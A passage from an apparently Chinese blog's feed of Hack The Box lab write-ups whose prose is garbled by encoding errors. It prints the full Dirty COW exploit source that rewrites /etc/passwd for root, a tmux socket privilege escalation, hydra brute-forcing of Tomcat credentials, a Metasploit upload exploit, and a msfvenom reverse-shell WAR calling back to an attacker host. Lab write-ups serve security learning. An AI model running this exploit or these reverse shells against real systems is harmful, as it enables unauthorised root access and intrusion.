class="comment">//</span></span><br><span class="line"><span class="comment">// Original exploit (dirtycow&#x27;s ptrace_pokedata &quot;pokemon&quot; method):</span></span><br><span class="line"><span class="comment">//   https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Compile with:</span></span><br><span class="line"><span class="comment">//   gcc -pthread dirty.c -o dirty -lcrypt</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Then run the newly create binary by either doing:</span></span><br><span class="line"><span class="comment">//   &quot;./dirty&quot; or &quot;./dirty my-new-password&quot;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Afterwards, you can either &quot;su firefart&quot; or &quot;ssh firefart@...&quot;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// DON&#x27;T FORGET TO RESTORE YOUR /etc/passwd AFTER RUNNING THE EXPLOIT!</span></span><br><span class="line"><span class="comment">//   mv /tmp/passwd.bak /etc/passwd</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Exploit adopted by Christian &quot;FireFart&quot; Mehlmauer</span></span><br><span class="line"><span class="comment">// https://firefart.at</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;crypt.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *filename = <span class="string">&quot;/etc/passwd&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *backup_filename = <span class="string">&quot;/tmp/passwd.bak&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *salt = <span class="string">&quot;firefart&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> f;</span><br><span class="line"><span class="keyword">void</span> *<span class="built_in">map</span>;</span><br><span class="line"><span class="keyword">pid_t</span> pid;</span><br><span class="line"><span class="keyword">pthread_t</span> pth;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Userinfo</span> &#123;</span></span><br><span class="line">   <span class="keyword">char</span> *username;</span><br><span class="line">   <span class="keyword">char</span> *hash;</span><br><span class="line">   <span class="keyword">int</span> user_id;</span><br><span class="line">   <span class="keyword">int</span> group_id;</span><br><span class="line">   <span class="keyword">char</span> *info;</span><br><span class="line">   <span class="keyword">char</span> *home_dir;</span><br><span class="line">   <span class="keyword">char</span> *shell;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">generate_password_hash</span><span class="params">(<span class="keyword">char</span> *plaintext_pw)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> crypt(plaintext_pw, salt);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">generate_passwd_line</span><span class="params">(struct Userinfo u)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *format = <span class="string">&quot;%s:%s:%d:%d:%s:%s:%s\n&quot;</span>;</span><br><span class="line">  <span class="keyword">int</span> size = <span class="built_in">snprintf</span>(<span class="literal">NULL</span>, <span class="number">0</span>, format, u.username, u.hash,</span><br><span class="line">    u.user_id, u.group_id, u.info, u.home_dir, u.shell);</span><br><span class="line">  <span class="keyword">char</span> *ret = <span class="built_in">malloc</span>(size + <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(ret, format, u.username, u.hash, u.user_id,</span><br><span class="line">    u.group_id, u.info, u.home_dir, u.shell);</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">madviseThread</span><span class="params">(<span class="keyword">void</span> *arg)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i, c = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">200000000</span>; i++) &#123;</span><br><span class="line">    c += madvise(<span class="built_in">map</span>, <span class="number">100</span>, MADV_DONTNEED);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;madvise %d\n\n&quot;</span>, c);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">copy_file</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *from, <span class="keyword">const</span> <span class="keyword">char</span> *to)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// check if target file already exists</span></span><br><span class="line">  <span class="keyword">if</span>(access(to, F_OK) != <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;File %s already exists! Please delete it and run again\n&quot;</span>,</span><br><span class="line">      to);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span> ch;</span><br><span class="line">  FILE *source, *target;</span><br><span class="line"></span><br><span class="line">  source = fopen(from, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(source == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  target = fopen(to, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span>(target == <span class="literal">NULL</span>) &#123;</span><br><span class="line">     fclose(source);</span><br><span class="line">     <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>((ch = fgetc(source)) != EOF) &#123;</span><br><span class="line">     fputc(ch, target);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s successfully backed up to %s\n&quot;</span>,</span><br><span class="line">    from, to);</span><br><span class="line"></span><br><span class="line">  fclose(source);</span><br><span class="line">  fclose(target);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// backup file</span></span><br><span class="line">  <span class="keyword">int</span> ret = copy_file(filename, backup_filename);</span><br><span class="line">  <span class="keyword">if</span> (ret != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">exit</span>(ret);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">Userinfo</span> <span class="title">user</span>;</span></span><br><span class="line">  <span class="comment">// set values, change as needed</span></span><br><span class="line">  user.username = <span class="string">&quot;firefart&quot;</span>;</span><br><span class="line">  user.user_id = <span class="number">0</span>;</span><br><span class="line">  user.group_id = <span class="number">0</span>;</span><br><span class="line">  user.info = <span class="string">&quot;pwned&quot;</span>;</span><br><span class="line">  user.home_dir = <span class="string">&quot;/root&quot;</span>;</span><br><span class="line">  user.shell = <span class="string">&quot;/bin/bash&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span> *plaintext_pw;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (argc &gt;= <span class="number">2</span>) &#123;</span><br><span class="line">    plaintext_pw = argv[<span class="number">1</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please enter the new password: %s\n&quot;</span>, plaintext_pw);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    plaintext_pw = getpass(<span class="string">&quot;Please enter the new password: &quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  user.hash = generate_password_hash(plaintext_pw);</span><br><span class="line">  <span class="keyword">char</span> *complete_passwd_line = generate_passwd_line(user);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Complete line:\n%s\n&quot;</span>, complete_passwd_line);</span><br><span class="line"></span><br><span class="line">  f = open(filename, O_RDONLY);</span><br><span class="line">  fstat(f, &amp;st);</span><br><span class="line">  <span class="built_in">map</span> = mmap(<span class="literal">NULL</span>,</span><br><span class="line">             st.st_size + <span class="keyword">sizeof</span>(<span class="keyword">long</span>),</span><br><span class="line">             PROT_READ,</span><br><span class="line">             MAP_PRIVATE,</span><br><span class="line">             f,</span><br><span class="line">             <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;mmap: %lx\n&quot;</span>,(<span class="keyword">unsigned</span> <span class="keyword">long</span>)<span class="built_in">map</span>);</span><br><span class="line">  pid = fork();</span><br><span class="line">  <span class="keyword">if</span>(pid) &#123;</span><br><span class="line">    waitpid(pid, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">int</span> u, i, o, c = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> l=<span class="built_in">strlen</span>(complete_passwd_line);</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10000</span>/l; i++) &#123;</span><br><span class="line">      <span class="keyword">for</span>(o = <span class="number">0</span>; o &lt; l; o++) &#123;</span><br><span class="line">        <span class="keyword">for</span>(u = <span class="number">0</span>; u &lt; <span class="number">10000</span>; u++) &#123;</span><br><span class="line">          c += ptrace(PTRACE_POKETEXT,</span><br><span class="line">                      pid,</span><br><span class="line">                      <span class="built_in">map</span> + o,</span><br><span class="line">                      *((<span class="keyword">long</span>*)(complete_passwd_line + o)));</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ptrace %d\n&quot;</span>,c);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    pthread_create(&amp;pth,</span><br><span class="line">                   <span class="literal">NULL</span>,</span><br><span class="line">                   madviseThread,</span><br><span class="line">                   <span class="literal">NULL</span>);</span><br><span class="line">    ptrace(PTRACE_TRACEME);</span><br><span class="line">    kill(getpid(), SIGSTOP);</span><br><span class="line">    pthread_join(pth,<span class="literal">NULL</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Done! Check %s to see if the new user was created.\n&quot;</span>, filename);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;You can log in with the username &#x27;%s&#x27; and the password &#x27;%s&#x27;.\n\n&quot;</span>,</span><br><span class="line">    user.username, plaintext_pw);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nDON&#x27;T FORGET TO RESTORE! $ mv %s %s\n&quot;</span>,</span><br><span class="line">    backup_filename, filename);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å°†è„ç‰›è„šæœ¬ä¸‹è½½åˆ°ç›®æ ‡æœºå™¨ä¸Š<br><img src="https://img-blog.csdnimg.cn/7be0601d01a245d49b8a950a8e1a4dd1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç„¶åç¼–è¯‘å¹¶è¿è¡Œè¿™ä¸ªè„šæœ¬ï¼Œæ–°è®¾ç½®çš„å¯†ç ä¸ºç©º</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -pthread 40389.c -o dirty -lcrypt</span><br><span class="line">./dirty</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/cf62ba35819c4ce38f1c526d9914aeae.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/01e976057cfd436eaf24c2139dbc1cd0.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="tmuxææƒ"><a href="#tmuxææƒ" class="headerlink" title="tmuxææƒ"></a>tmuxææƒ</h2><p>é™¤äº†è„ç‰›ï¼Œæˆ‘ä»¬è¿˜å‘ç°ä»¥rootç”¨æˆ·è¿è¡Œçš„tmuxç¨‹åº<br><img src="https://img-blog.csdnimg.cn/ee02125d05bb444ca867c42b495afc29.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>é‚£ä¹ˆæˆ‘ä»¬ç›´æ¥è¿è¡Œå‘½ä»¤ï¼Œå°±èƒ½å¤Ÿææƒåˆ°rootä¸Šäº†</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/usr/bin/tmux -S /.devs/dev_sess</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/b4674887be004a4a8ba43204d0642eed.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
]]></content>
      <categories>
        <category>å¿ƒè„æ»´è¡€</category>
      </categories>
      <tags>
        <tag>Hack The Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Jerry</title>
    <url>/2021/12/24/Jerry/</url>
    <content><![CDATA[<h2 id="é¶æœºä¿¡æ¯"><a href="#é¶æœºä¿¡æ¯" class="headerlink" title="é¶æœºä¿¡æ¯"></a>é¶æœºä¿¡æ¯</h2><p><img src="https://img-blog.csdnimg.cn/d5f1dc82530e485e91e914d59c62f9ff.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œç›®æ ‡ä¸»æœºåªå¼€æ”¾äº†8080ç«¯å£ï¼Œè€Œä¸”ç‰ˆæœ¬è¿˜æ˜¯<code>7.0.88</code>çš„<br><img src="https://img-blog.csdnimg.cn/12b2a2ded3544b248ce0ae24e4c30139.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<span id="more"></span>

<p>æˆ‘ä»¬ç«‹é©¬ç™»å½•tomcaté¡µé¢ï¼Œå¹¶ä¸”å°è¯•è´¦æˆ·å’Œå¯†ç éƒ½æ˜¯adminï¼Œçœ‹çœ‹èƒ½ä¸èƒ½ç™»å½•æˆåŠŸï¼Œç»“æœæ˜¯å¤±è´¥çš„ã€‚<br><img src="https://img-blog.csdnimg.cn/14569a31b1e04d76855654582e15e833.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/a1c59a404d30477d9434d5ca81214227.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>æˆ‘ä»¬ä¸‹è½½<code>seclists</code>è¿™ä¸ªå·¥å…·ï¼Œå¯¹tomcatçš„é»˜è®¤ç”¨æˆ·åå’Œå¯†ç è¿›è¡Œæš´åŠ›ç ´è§£<br><img src="https://img-blog.csdnimg.cn/4573275f27314e41997be90a187c528b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<!--more-->

<p>æˆ‘ä»¬ä½¿ç”¨hydraå·¥å…·å¯¹è´¦å·å¯†ç è¿›è¡Œç ´è§£ï¼Œå‘ç°è´¦å·æ˜¯tomcatï¼Œå¯†ç æ˜¯s3cret</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -C /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt http://10.10.10.95:8080/manager/html</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/2e489a5e1395436f87bbc2c1c05db04b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h3 id="MSFè·å–æƒé™"><a href="#MSFè·å–æƒé™" class="headerlink" title="MSFè·å–æƒé™"></a>MSFè·å–æƒé™</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">search tomcat_mgr</span><br><span class="line">use exploit/multi/http/tomcat_upload</span><br><span class="line">show options</span><br><span class="line"><span class="built_in">set</span> rhosts 10.10.10.95</span><br><span class="line"><span class="built_in">set</span> lhost 10.10.14.11</span><br><span class="line"><span class="built_in">set</span> httpusername tomcat</span><br><span class="line"><span class="built_in">set</span> httppassword s3cret</span><br><span class="line"><span class="built_in">set</span> rport 8080</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/405b1654a30e4fd8b5ff405938d24a51.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬è·å–ä¸€ä¸ªshellï¼Œå‘ç°å·²ç»æ˜¯æœ€é«˜æƒé™äº†<br><img src="https://img-blog.csdnimg.cn/efd9843d30e5431cbe6ae1408fbcb011.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æŸ¥çœ‹åˆ°flagå€¼äº†<br><img src="https://img-blog.csdnimg.cn/89ecac8618f24fdf9edd6cf96a419036.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h3 id="NCåå¼¹shell"><a href="#NCåå¼¹shell" class="headerlink" title="NCåå¼¹shell"></a>NCåå¼¹shell</h3><p>é¦–å…ˆæˆ‘ä»¬å…ˆå‡†å¤‡ä¸€ä¸ªæœ¨é©¬</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp lhost=10.10.14.11 lport=1234 -f war &gt; shell.war</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/c4abdde92c484b46ac8782a2c62da4fa.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬ä½¿ç”¨è´¦å·å¯†ç ç™»å½•è¿›éƒ¨ç½²é¡µé¢ï¼Œå¹¶å°†ç”Ÿæˆçš„æœ¨é©¬éƒ¨ç½²è¿›tomcatæœåŠ¡å™¨ä¸Š<br><img src="https://img-blog.csdnimg.cn/9dd05049c33f45cf971a5f70a9a6d2e8.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç„¶åæˆ‘ä»¬å¯åŠ¨ncè¿›è¡Œç›‘å¬ï¼Œå¹¶ä¸”åœ¨æµè§ˆå™¨ä¸Šæµè§ˆæˆ‘ä»¬åˆšåˆšä¸Šä¼ çš„waråŒ…ï¼Œåå¼¹shellæˆåŠŸã€‚<br><img src="https://img-blog.csdnimg.cn/fbcd897e89c149549ead8a54352163ae.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/488c679d14e64be28972f71dab63504a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
]]></content>
      <categories>
        <category>ä¸­é—´ä»¶</category>
      </categories>
      <tags>
        <tag>Hack The Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Atom</title>
    <url>/2021/12/24/Atom/</url>
    <content><![CDATA[<h2 id="é¶æœºä¿¡æ¯"><a href="#é¶æœºä¿¡æ¯" class="headerlink" title="é¶æœºä¿¡æ¯"></a>é¶æœºä¿¡æ¯</h2><p><img src="https://img-blog.csdnimg.cn/d7ff3a26ad1b4b0680f0d4283d757a77.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>å¯ä»¥çœ‹åˆ°é¶æœºå¼€æ”¾äº†80ç«¯å£ï¼Œé‚£è¯æ˜å°±å­˜åœ¨webæœåŠ¡ã€‚<br><img src="https://img-blog.csdnimg.cn/71d80ba7cc3748c4a4f0402a9793083a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/458004df73e046d6ac29665f942ae2a1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<span id="more"></span>

<p>å¾€ä¸‹çœ‹çš„æ—¶å€™ï¼Œå‘ç°guestç”¨æˆ·å¯ä»¥ç™»å½•smbæœåŠ¡ï¼Œé‚£æˆ‘ä»¬å°±å…ˆçœ‹çœ‹smbæœåŠ¡é‡Œè¾¹éƒ½æœ‰å“ªäº›æœ‰ä»·å€¼çš„ä¿¡æ¯ã€‚<br><img src="https://img-blog.csdnimg.cn/35ce3f11c2ea4febac8767c3761d9f0f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä½¿ç”¨åŒ¿åç™»å½•çœ‹çœ‹å¯ä»¥è®¿é—®åˆ°å“ªäº›ä¿¡æ¯ï¼Œå¯ä»¥çœ‹åˆ°å…·æœ‰è¯»å†™æƒé™çš„ç›®å½•åªæœ‰<code>Software_Updates</code>è¿™ä¸ªç›®å½•<br><img src="https://img-blog.csdnimg.cn/901c2bdb6d4d4e7da7675e1c24ee1e36.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬ç™»å½•è¿›è¿™ä¸ªç›®å½•ä¸­ï¼Œæœ‰ä¸€ä¸ªpdfæ–‡ä»¶å¯ä»¥ä¸‹è½½ï¼Œæˆ‘ä»¬ä¸‹è½½æŸ¥çœ‹äº†ä¸‹é‡Œé¢çš„å†…å®¹ã€‚<br><img src="https://img-blog.csdnimg.cn/2ecb65835531481289d535ee549568a4.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/1edacfc8f7844517bae4f0e7dbd97af0.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<!--more-->

